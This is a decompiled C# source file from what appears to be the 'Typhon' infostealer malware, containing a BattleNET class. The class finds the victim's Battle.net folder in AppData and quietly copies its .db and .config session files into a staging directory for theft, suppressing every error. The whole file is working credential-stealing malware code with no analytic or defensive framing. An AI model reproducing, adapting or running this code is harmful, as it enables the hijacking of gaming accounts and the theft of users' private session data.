using System;
using System.IO;

namespace Typhon.Stealer.Software.Gaming
{
	// Token: 0x0200001D RID: 29
	internal class BattleNET
	{
		// Token: 0x06000078 RID: 120 RVA: 0x00005230 File Offset: 0x00003430
		public static void GetSession(string sSavePath)
		{
			if (!Directory.Exists(BattleNET.Path))
			{
				return;
			}
			try
			{
				Directory.CreateDirectory(sSavePath);
				foreach (string searchPattern in new string[]
				{
					"*.db",
					"*.config"
				})
				{
					foreach (string fileName in Directory.GetFiles(BattleNET.Path, searchPattern, SearchOption.AllDirectories))
					{
						try
						{
							string text = null;
							FileInfo fileInfo = new FileInfo(fileName);
							if (fileInfo.Directory != null)
							{
								text = ((fileInfo.Directory != null && fileInfo.Directory.Name == "Battle.net") ? sSavePath : System.IO.Path.Combine(sSavePath, fileInfo.Directory.Name));
							}
							if (!Directory.Exists(text) && text != null)
							{
								Directory.CreateDirectory(text);
							}
							if (text != null)
							{
								fileInfo.CopyTo(System.IO.Path.Combine(text, fileInfo.Name));
							}
						}
						catch
						{
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400003E RID: 62
		private static readonly string Path = System.IO.Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Battle.net");
	}
}
